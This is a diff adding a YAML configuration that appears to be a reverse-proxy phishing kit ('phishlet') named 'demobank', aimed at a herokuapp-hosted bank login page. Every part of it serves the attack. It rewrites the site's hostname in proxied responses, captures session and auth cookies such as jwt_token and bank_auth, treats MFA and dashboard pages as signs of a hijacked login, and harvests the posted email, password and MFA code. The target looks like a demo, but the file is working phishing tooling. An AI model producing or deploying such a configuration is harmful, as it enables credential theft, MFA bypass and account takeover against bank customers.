@@ -1,0 +1,72 @@
+name: "demobank"
+author: "@corgi"
+min_ver: "3.0.0"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "francophone-minister-64486-49a3392d46fc.herokuapp.com",
+      session: true,
+      is_landing: true,
+    }
+
+sub_filters:
+  - {
+      triggers_on: "francophone-minister-64486-49a3392d46fc.herokuapp.com",
+      orig_sub: "",
+      domain: "francophone-minister-64486-49a3392d46fc.herokuapp.com",
+      search: 'francophone-minister-64486-49a3392d46fc\\.herokuapp\\.com',
+      replace: "{hostname}",
+      mimes:
+        ["text/html", "application/json", "application/javascript", "text/css"],
+    }
+
+auth_tokens:
+  - {
+      domain: "francophone-minister-64486-49a3392d46fc.herokuapp.com",
+      keys:
+        [
+          "jwt_token",
+          "auth_token",
+          "session_id",
+          "user_session",
+          "bank_auth",
+          "login_state",
+        ],
+    }
+  - {
+      domain: ".francophone-minister-64486-49a3392d46fc.herokuapp.com",
+      keys:
+        [
+          "jwt_token",
+          "auth_token",
+          "session_id",
+          "user_session",
+          "bank_auth",
+          "login_state",
+        ],
+    }
+
+auth_urls:
+  - '.*\/mfa.*'
+  - '.*\/dashboard.*'
+  - '.*\/api.*'
+
+login:
+  domain: "francophone-minister-64486-49a3392d46fc.herokuapp.com"
+  path: "/login"
+
+credentials:
+  username:
+    key: "email"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "mfa_code"
+      search: "(.*)"
+      type: "post"
